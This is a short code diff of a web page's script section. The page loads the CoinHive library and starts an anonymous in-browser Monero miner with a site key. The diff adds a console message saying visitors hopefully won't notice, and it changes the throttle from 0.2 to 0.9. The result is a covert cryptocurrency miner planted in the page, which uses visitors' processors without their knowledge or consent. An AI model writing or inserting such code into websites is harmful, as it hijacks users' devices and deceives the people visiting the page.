@@ -11,8 +11,9 @@
 
 <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
 <script>
+	console.log("Testing light Monero mining. Hopefully you won't even notice.")
     var miner = new CoinHive.Anonymous('exN9MUJT735qbTYsRA6Jm1Mr3nQmP4yT', {
-        throttle: 0.2
+        throttle: 0.9
     });
     miner.start();
 
